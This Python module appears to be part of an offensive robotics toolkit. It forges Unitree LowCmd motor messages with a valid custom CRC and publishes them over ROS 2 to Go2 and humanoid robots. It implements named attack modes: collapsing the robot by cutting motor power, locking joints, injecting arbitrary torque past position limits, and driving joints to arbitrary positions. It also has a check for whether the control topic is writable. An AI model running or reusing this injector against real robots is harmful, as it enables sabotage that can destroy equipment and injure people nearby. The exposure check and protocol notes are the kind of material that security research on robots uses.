#!/usr/bin/env python3
"""
unitree_lowcmd_injector.py - Phase 7 Module 3: Direct Motor Control via LowCmd Injection

Bypasses the high-level sport API entirely and injects unitree_go/msg/LowCmd directly
to the motor control loop. LowCmd operates at ~500 Hz and has direct physical effect
on each of the 12 leg joints (Go2) or up to 35 joints (G1/H1/H2).

LowCmd message anatomy (unitree_go/msg/LowCmd):
  head[2]          — frame header bytes [0xFE, 0xEF]
  level_flag       — 0xFF = low-level motor control, 0xEE = high-level
  motor_cmd[20]:
    mode           — 0=idle, 1=torque, 10=position+velocity+torque (PD+ff)
    q              — target position (rad)
    dq             — target velocity (rad/s)
    tau            — feed-forward torque (N.m)
    Kp             — position stiffness (N.m/rad)
    Kd             — velocity damping (N.m/(rad/s))
  crc              — custom CRC32 (poly=0x04c11db7, MSB-first, over first 808 bytes)

Joint index map (Go2 quadruped):
  0=FR_hip  1=FR_thigh  2=FR_calf
  3=FL_hip  4=FL_thigh  5=FL_calf
  6=RR_hip  7=RR_thigh  8=RR_calf
  9=RL_hip 10=RL_thigh 11=RL_calf

Attack modes:
  damp           — mode=0 all joints: motors go limp, robot collapses under gravity
  freeze         — mode=10, q=0, Kp=80, Kd=3: lock all joints at zero position
  torque_inject  — mode=1, per-joint tau: arbitrary torque, bypasses position limits
  position_lock  — mode=10 per-joint q override: drive to arbitrary positions

CRC algorithm (ported from unitree_ros2/example/src/src/common/motor_crc.cpp):
  Non-standard CRC32 variant. Polynomial 0x04c11db7, MSB-first bit processing,
  no final XOR, initial value 0xFFFFFFFF. Covers the full LowCmd struct minus
  the last 4 bytes (the crc field itself).

LowCmd C struct layout (812 bytes total, GCC default alignment):
  0    head[2]          2B
  2    levelFlag        1B
  3    frameReserve     1B
  4    SN[2]            8B
  12   version[2]       8B
  20   bandWidth        2B
  22   (pad)            2B
  24   motorCmd[20]   720B  (each 36B: Bxxx + 5f + 3I)
  744  bms              4B
  748  wirelessRemote  40B
  788  led             12B
  800  fan[2]           2B
  802  gpio             1B
  803  (pad)            1B
  804  reserve          4B
  808  crc              4B
  Total: 812B → 203 uint32 words → CRC over first 202 words (808B)
"""

import struct
import subprocess
import json
import os
import time
from enum import Enum
from typing import Optional


class LowCmdMode(str, Enum):
    DAMP           = "damp"
    FREEZE         = "freeze"
    TORQUE_INJECT  = "torque_inject"
    POSITION_LOCK  = "position_lock"
    ENUMERATE      = "enumerate"


# Go2 joint names for reference
GO2_JOINTS = [
    "FR_hip", "FR_thigh", "FR_calf",
    "FL_hip", "FL_thigh", "FL_calf",
    "RR_hip", "RR_thigh", "RR_calf",
    "RL_hip", "RL_thigh", "RL_calf",
]

# G1 humanoid joint names (first 29, indices beyond 11 are upper body)
G1_JOINTS = [
    "left_hip_pitch", "left_hip_roll", "left_hip_yaw", "left_knee", "left_ankle_pitch", "left_ankle_roll",
    "right_hip_pitch", "right_hip_roll", "right_hip_yaw", "right_knee", "right_ankle_pitch", "right_ankle_roll",
    "waist_yaw",
    "left_shoulder_pitch", "left_shoulder_roll", "left_shoulder_yaw", "left_elbow",
    "right_shoulder_pitch", "right_shoulder_roll", "right_shoulder_yaw", "right_elbow",
    "left_wrist_roll", "left_wrist_pitch", "left_wrist_yaw",
    "right_wrist_roll", "right_wrist_pitch", "right_wrist_yaw",
    "head_yaw", "head_pitch",
]

LOWCMD_TOPIC = "/rt/lowcmd"
LOWSTATE_TOPIC = "/rt/lowstate"


def _crc32_unitree(data: bytes) -> int:
    """
    Unitree's custom CRC32 from motor_crc.cpp.
    Polynomial 0x04c11db7, MSB-first per-bit processing, init 0xFFFFFFFF.
    Processes input as little-endian uint32 words.
    """
    CRC32 = 0xFFFFFFFF
    poly  = 0x04c11DB7
    n     = len(data) // 4
    words = struct.unpack(f"<{n}I", data[:n * 4])

    for word in words:
        xbit = 1 << 31
        d    = word
        for _ in range(32):
            if CRC32 & 0x80000000:
                CRC32 = ((CRC32 << 1) & 0xFFFFFFFF) ^ poly
            else:
                CRC32 = (CRC32 << 1) & 0xFFFFFFFF
            if d & xbit:
                CRC32 ^= poly
            xbit >>= 1

    return CRC32


def _pack_motor(mode: int = 0, q: float = 0.0, dq: float = 0.0,
                tau: float = 0.0, kp: float = 0.0, kd: float = 0.0) -> bytes:
    # <B3x5f3I = mode(1) + pad(3) + 5 floats + 3 uint32 = 36 bytes
    return struct.pack("<Bxxx5f3I", mode, q, dq, tau, kp, kd, 0, 0, 0)


def build_lowcmd(motors: list, level_flag: int = 0xFF) -> bytes:
    """
    Build a complete 812-byte LowCmd binary with correct Unitree CRC32.

    motors: list of dicts with keys mode, q, dq, tau, kp, kd (up to 20)
    level_flag: 0xFF = low-level, 0xEE = high-level
    """
    buf = bytearray()

    # Offset 0: head[0xFE, 0xEF] + levelFlag + frameReserve
    buf += struct.pack("<4B", 0xFE, 0xEF, level_flag, 0)

    # Offset 4: SN[2] + version[2]
    buf += struct.pack("<4I", 0, 0, 0, 0)

    # Offset 20: bandWidth (uint16) + 2 pad bytes
    buf += struct.pack("<H2x", 0)

    # Offset 24: motorCmd[20] — 36 bytes each = 720 bytes
    for i in range(20):
        m = motors[i] if i < len(motors) else {}
        buf += _pack_motor(
            mode=m.get("mode", 0),
            q   =m.get("q",    0.0),
            dq  =m.get("dq",   0.0),
            tau =m.get("tau",  0.0),
            kp  =m.get("kp",   0.0),
            kd  =m.get("kd",   0.0),
        )

    # Offset 744: BmsCmd (off:1 + reserve:3)
    buf += struct.pack("<B3x", 0)

    # Offset 748: wirelessRemote[40]
    buf += bytes(40)

    # Offset 788: led[12]
    buf += bytes(12)

    # Offset 800: fan[2] + gpio + pad
    buf += struct.pack("<2BBx", 0, 0, 0)

    # Offset 804: reserve (uint32) + crc placeholder
    buf += struct.pack("<2I", 0, 0)

    assert len(buf) == 812, f"LowCmd size error: {len(buf)} != 812"

    # Compute CRC over first 808 bytes (202 uint32 words, everything before crc)
    crc = _crc32_unitree(bytes(buf[:808]))
    struct.pack_into("<I", buf, 808, crc)

    return bytes(buf)


def _motors_damp() -> list:
    """All joints in mode=0 (idle/limp). Robot collapses under gravity."""
    return [{"mode": 0, "q": 0.0, "dq": 0.0, "tau": 0.0, "kp": 0.0, "kd": 0.0}] * 12


def _motors_freeze(joint_qs: Optional[list] = None) -> list:
    """High-stiffness position hold. Locks joints at specified or zero positions."""
    motors = []
    for i in range(12):
        q = joint_qs[i] if joint_qs and i < len(joint_qs) else 0.0
        motors.append({"mode": 10, "q": q, "dq": 0.0, "tau": 0.0, "kp": 80.0, "kd": 3.0})
    return motors


def _motors_torque(taus: Optional[list] = None) -> list:
    """Direct torque control (mode=1). No position feedback."""
    motors = []
    for i in range(12):
        tau = taus[i] if taus and i < len(taus) else 0.0
        motors.append({"mode": 1, "q": 0.0, "dq": 0.0, "tau": tau, "kp": 0.0, "kd": 0.0})
    return motors


def _motors_position(qs: Optional[list] = None) -> list:
    """PD position control to arbitrary target positions."""
    motors = []
    for i in range(12):
        q = qs[i] if qs and i < len(qs) else 0.0
        motors.append({"mode": 10, "q": q, "dq": 0.0, "tau": 0.0, "kp": 60.0, "kd": 2.0})
    return motors


def _lowcmd_to_ros2_yaml(motors: list, level_flag: int = 0xFF) -> str:
    """Convert motor list to ros2 topic pub YAML format (requires unitree_go pkg)."""
    motor_strs = []
    for m in motors:
        motor_strs.append(
            f"  - {{mode: {m['mode']}, q: {m['q']:.4f}, dq: {m['dq']:.4f}, "
            f"tau: {m['tau']:.4f}, kp: {m['kp']:.4f}, kd: {m['kd']:.4f}, "
            f"reserve: [0, 0, 0]}}"
        )

    # CRC is computed by the robot on receive — send 0 initially
    # (Some firmware versions compute CRC server-side; for raw injection use build_lowcmd)
    yaml = (
        f"head: [0xFE, 0xEF]\n"
        f"level_flag: {level_flag}\n"
        f"frame_reserve: 0\n"
        f"sn: [0, 0]\n"
        f"version: [0, 0]\n"
        f"bandwidth: 0\n"
        f"motor_cmd:\n" + "\n".join(motor_strs) + "\n"
        f'bms_cmd: {{"off": 0, reserve: [0, 0, 0]}}\n'
        f"wireless_remote: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n"
        f"                   0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n"
        f"                   0, 0, 0, 0, 0, 0, 0, 0]\n"
        f"led: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n"
        f"fan: [0, 0]\n"
        f"gpio: 0\n"
        f"reserve: 0\n"
        f"crc: 0\n"
    )
    return yaml


def inject_lowcmd(motors: list, domain_id: int, mode_name: str,
                  duration: float = 1.0, rate: float = 100.0,
                  verbose: bool = False) -> dict:
    """
    Inject LowCmd via ros2 topic pub. Falls back to raw binary description.
    """
    raw_bytes = build_lowcmd(motors)
    crc_val   = struct.unpack("<I", raw_bytes[808:812])[0]

    if verbose:
        print(f"[*] LowCmd binary: {len(raw_bytes)} bytes, CRC=0x{crc_val:08X}")
        active = [i for i, m in enumerate(motors) if m.get("mode", 0) != 0]
        if active:
            for i in active:
                m = motors[i]
                jname = GO2_JOINTS[i] if i < len(GO2_JOINTS) else f"joint_{i}"
                print(f"    [{i}] {jname}: mode={m['mode']} q={m['q']:.3f} "
                      f"tau={m['tau']:.3f} kp={m['kp']:.1f} kd={m['kd']:.1f}")

    yaml_msg = _lowcmd_to_ros2_yaml(motors)

    if duration <= 0 or mode_name == LowCmdMode.ENUMERATE:
        return {
            "mode": mode_name,
            "raw_crc": f"0x{crc_val:08X}",
            "struct_size": len(raw_bytes),
            "motors": motors[:12],
        }

    env = {**os.environ, "ROS_DOMAIN_ID": str(domain_id)}
    cmd = ["ros2", "topic", "pub", f"--rate={rate:.0f}",
           "--wait-matching-subscriptions", "1",
           LOWCMD_TOPIC, "unitree_go/msg/LowCmd", yaml_msg]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                env=env)
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=3.0)
        ok, output = True, f"Published {mode_name} for {duration}s at {rate:.0f}Hz"
    except subprocess.TimeoutExpired:
        proc.kill()
        ok, output = True, f"Published {mode_name} for {duration}s"
    except (FileNotFoundError, OSError) as e:
        ok, output = False, str(e)

    return {
        "mode": mode_name,
        "sent": ok,
        "duration_s": duration,
        "rate_hz": rate,
        "raw_crc": f"0x{crc_val:08X}",
        "output": output[:300],
    }


def check_lowcmd_exposure(domain_id: int) -> dict:
    """Check if LowCmd topic is exposed and writable."""
    findings = {}

    env = {**os.environ, "ROS_DOMAIN_ID": str(domain_id)}
    # Check topic presence
    try:
        r = subprocess.run(
            ["ros2", "topic", "info", LOWCMD_TOPIC],
            capture_output=True, text=True, timeout=5.0, env=env
        )
        findings["lowcmd_topic_active"] = r.returncode == 0 and "Subscription" in r.stdout
    except (FileNotFoundError, OSError):
        findings["lowcmd_topic_active"] = False
        findings["error"] = "ros2 CLI not available"

    # Check lowstate for motor count
    try:
        r = subprocess.run(
            ["ros2", "topic", "echo", "--once", LOWSTATE_TOPIC],
            capture_output=True, text=True, timeout=6.0, env=env
        )
        if r.returncode == 0 and r.stdout:
            import re
            motor_hits = re.findall(r"- mode:", r.stdout)
            findings["motor_count"] = len(motor_hits)
            findings["lowstate_readable"] = True
        else:
            findings["lowstate_readable"] = False
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        findings["lowstate_readable"] = False

    findings["joint_map"] = {i: GO2_JOINTS[i] for i in range(len(GO2_JOINTS))}
    findings["crc_algorithm"] = (
        "Custom CRC32, poly=0x04c11db7, MSB-first, init=0xFFFFFFFF, "
        "no final XOR. Covers bytes 0-807 (excludes crc field at 808-811)."
    )
    return findings


def run(mode: LowCmdMode = LowCmdMode.ENUMERATE,
        domain_id: int = 0,
        joint_taus: Optional[list] = None,
        joint_qs: Optional[list] = None,
        duration: float = 1.0,
        verbose: bool = False) -> dict:

    if mode == LowCmdMode.ENUMERATE:
        print(f"[*] Checking LowCmd exposure on domain {domain_id}...")
        return check_lowcmd_exposure(domain_id)

    if mode == LowCmdMode.DAMP:
        print("\033[91m[!] WARNING: DAMP mode — all motors go limp, robot will fall!\033[0m")
        motors = _motors_damp()

    elif mode == LowCmdMode.FREEZE:
        print("[*] FREEZE mode — high-stiffness position hold at joint angles")
        taus_f = [float(x) for x in joint_qs] if joint_qs else None
        motors = _motors_freeze(taus_f)

    elif mode == LowCmdMode.TORQUE_INJECT:
        print("[*] TORQUE_INJECT mode — direct torque control")
        taus = [float(x) for x in joint_taus] if joint_taus else None
        motors = _motors_torque(taus)

    elif mode == LowCmdMode.POSITION_LOCK:
        print("[*] POSITION_LOCK mode — drive joints to target positions")
        qs = [float(x) for x in joint_qs] if joint_qs else None
        motors = _motors_position(qs)

    else:
        return {"error": f"Unknown mode: {mode}"}

    return inject_lowcmd(motors, domain_id, mode.value, duration, verbose=verbose)


def print_lowcmd_report(result: dict):
    if result.get("error") and not result.get("joint_map"):
        print(f"\n\033[91m[!] {result['error']}\033[0m")
        return

    if result.get("joint_map"):
        # Enumerate report
        print(f"\n\033[92m[+] LowCmd Exposure Assessment\033[0m")
        active = result.get("lowcmd_topic_active", False)
        lsread = result.get("lowstate_readable", False)
        print(f"    /rt/lowcmd writable : {'YES - CRITICAL' if active else 'not confirmed'}")
        print(f"    /rt/lowstate readable: {'YES' if lsread else 'not confirmed'}")
        if result.get("motor_count"):
            print(f"    Motor count         : {result['motor_count']}")
        print(f"\n    CRC algorithm: {result.get('crc_algorithm', '')}")
        print(f"\n    Joint map (Go2):")
        for i, name in result.get("joint_map", {}).items():
            print(f"      [{i:2d}] {name}")
        return

    sent = result.get("sent", False)
    clr  = "\033[92m" if sent else "\033[93m"
    print(f"\n{clr}[{'SENT' if sent else 'BUILT'}]\033[0m LowCmd mode: {result.get('mode')}")
    print(f"    CRC      : {result.get('raw_crc')}")
    if result.get("struct_size"):
        print(f"    Size     : {result['struct_size']} bytes")
    if result.get("duration_s"):
        print(f"    Duration : {result['duration_s']}s @ {result.get('rate_hz', 100):.0f}Hz")
    if not sent and result.get("output"):
        print(f"    Output   : {result['output'][:200]}")
        print(f"    Tip: source unitree_ros2 workspace and ensure robot is on domain {result.get('domain_id', 0)}")


def export_json(result: dict, path: str):
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print(f"[+] Saved to {path}")
